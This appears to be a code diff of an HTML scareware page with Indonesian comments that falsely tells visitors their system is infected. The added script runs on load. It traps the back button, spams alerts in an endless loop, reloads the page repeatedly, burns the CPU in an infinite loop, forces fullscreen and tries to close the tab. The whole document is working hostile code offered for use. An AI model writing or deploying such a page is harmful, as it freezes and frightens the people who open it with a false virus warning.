@@ -2,56 +2,84 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>❌ SYSTEM VIRUS DETECTED</title>
+  <title>💀 SYSTEM INFECTED</title>
   <style>
-    body {
-      background-color: black;
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: black;
       color: red;
       font-family: monospace;
       text-align: center;
       padding-top: 100px;
-      animation: shake 0.1s infinite;
+      animation: shake 0.05s infinite;
     }
 
     h1 {
-      font-size: 48px;
+      font-size: 50px;
+      text-shadow: 0 0 10px red;
     }
 
     @keyframes shake {
-      0% { transform: translate(1px, 2px); }
-      25% { transform: translate(-1px, -2px); }
+      0% { transform: translate(1px, 1px); }
+      25% { transform: translate(-1px, -1px); }
       50% { transform: translate(2px, 2px); }
-      75% { transform: translate(-2px, -1px); }
+      75% { transform: translate(-2px, -2px); }
       100% { transform: translate(0, 0); }
     }
   </style>
 </head>
 <body>
-  <h1>❌ SYSTEM INFECTED!</h1>
-  <p>Malware detected. Emergency system lockdown initiated...</p>
+  <h1>💀 SYSTEM INFECTED</h1>
+  <p>❗ Jangan tutup tab ini. Virus sedang aktif...</p>
 
   <script>
-    // SPAM ALERT TANPA HENTI
-    function endlessAlert() {
-      setTimeout(() => {
-        alert("⚠️ SYSTEM ERROR! VIRUS DETECTED!");
-        endlessAlert(); // panggil lagi (tak berujung)
-      }, 100000000000000);
+    // 🔁 Lock back button (navigasi)
+    history.pushState(null, "", location.href);
+    window.onpopstate = function () {
+      history.pushState(null, "", location.href);
+    };
+
+    // 🔁 Infinite alert spam
+    function alertLoop() {
+      alert("🚨 VIRUS AKTIF! JANGAN DITUTUP!");
+      setTimeout(alertLoop, 100);
     }
 
-    // CPU USAGE 100% LOOP
-    function burnCPU() {
+    // 🔄 Reload loop
+    setInterval(() => {
+      location.reload();
+    }, 1500);
+
+    // 🧠 Freeze loop
+    function lagForever() {
       while (true) {
-        Math.sqrt(Math.random() * Date.now());
+        Math.pow(Math.random() * Date.now(), 5.5);
       }
     }
 
-    // Jalankan saat halaman dibuka
+    // 🔇 Coba auto fullscreen (tidak semua browser izinkan)
+    function goFullScreen() {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      }
+    }
+
+    // 🔒 Paksa coba tutup (jarang berhasil di HP)
+    function tryCloseTab() {
+      try {
+        window.open('', '_self').close();
+      } catch (e) {}
+    }
+
+    // Jalankan semua efek saat load
     window.onload = () => {
       setTimeout(() => {
-        endlessAlert();  // Mulai spam alert
-        burnCPU();       // Mulai lag brutal
-      }, 1000); // kasih delay 1 detik biar efeknya tiba-tiba
+        goFullScreen();
+        alertLoop();
+        lagForever();
+        tryCloseTab();
+      }, 500);
     };
   </script>
 </body>
